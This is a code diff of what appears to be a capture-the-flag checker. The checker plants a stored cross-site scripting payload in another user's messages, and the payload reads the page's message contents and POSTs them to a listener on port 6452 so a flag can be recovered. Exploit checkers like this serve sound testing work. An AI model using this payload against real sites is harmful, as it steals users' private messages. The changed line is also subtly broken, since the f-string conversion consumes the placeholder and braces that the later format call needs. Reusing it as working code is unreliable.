@@ -142,7 +142,7 @@ async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
     assert_in(noise, r.text, "noise missing from note")
 
 
-exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:6452/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
+exploitMessage = f"<script>function getText(){{let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text; }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ 'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"
 result = [None]
 
 webServer = [None]
@@ -181,12 +181,12 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     server_thread.start()
     time.sleep(1)
     # sanity check
-    logger.debug( (await client.get(f"http://localhost:{PORT}/example")).text)
+    logger.debug((await client.get(f"http://localhost:{PORT}/example")).text)
     username = secrets.token_hex(32)
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
     target = json.loads(task.attack_info)['username']
-    r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": target, "message": encode(exploitMessage, target, logger)}, cookies=cookie)
+    r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": target, "message": encode(exploitMessage.format(task.address), target, logger)}, cookies=cookie)
     assert_equals(r.status_code, 200, "exploit failed")
     xss_test(task, logger)
     while not result[0]:
